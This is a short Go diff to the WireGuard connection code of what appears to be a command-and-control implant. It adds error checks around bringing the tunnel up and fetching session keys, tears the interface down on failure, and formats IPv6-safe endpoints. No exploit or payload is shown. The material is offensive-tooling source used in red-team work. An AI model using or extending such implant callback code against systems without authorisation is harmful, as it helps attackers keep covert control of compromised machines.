@@ -236,6 +236,10 @@ func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	return envelope, nil
 }
 
+func formatWGEndpoint(address string, port uint16) string {
+	return net.JoinHostPort(address, strconv.Itoa(int(port)))
+}
+
 // getSessKeys - Connect to the wireguard server and retrieve session specific keys and IP
 func getSessKeys(address string, port uint16) error {
 	_, dev, tNet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)
@@ -243,7 +247,9 @@ func getSessKeys(address string, port uint16) error {
 		return err
 	}
 
-	dev.Up()
+	if err := dev.Up(); err != nil {
+		return err
+	}
 
 	// {{if .Config.Debug}}
 	log.Printf("Initial wg connection. Attempting to connect to wg key exchange listener")
@@ -254,6 +260,7 @@ func getSessKeys(address string, port uint16) error {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to wg key exchange listener: %v", err)
 		// {{end}}
+		_ = dev.Down()
 		return err
 	}
 
@@ -278,7 +285,10 @@ func getSessKeys(address string, port uint16) error {
 // WGConnect - Get a wg connection or die trying
 func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 	if wgSessPrivKey == "" || failedConn > 2 {
-		getSessKeys(address, port)
+		if err := getSessKeys(address, port); err != nil {
+			failedConn++
+			return nil, nil, err
+		}
 	}
 
 	// Bring up actual wireguard connection using retrieved keys and IP
@@ -332,7 +342,7 @@ func bringUpWGInterface(address string, port uint16, implantPrivKey string, serv
 	wgConf := bytes.NewBuffer(nil)
 	fmt.Fprintf(wgConf, "private_key=%s\n", implantPrivKey)
 	fmt.Fprintf(wgConf, "public_key=%s\n", serverPubKey)
-	fmt.Fprintf(wgConf, "endpoint=%s:%d\n", address, port)
+	fmt.Fprintf(wgConf, "endpoint=%s\n", formatWGEndpoint(address, port))
 	fmt.Fprintf(wgConf, "allowed_ip=%s/0\n", "0.0.0.0")
 
 	// {{if .Config.Debug}}
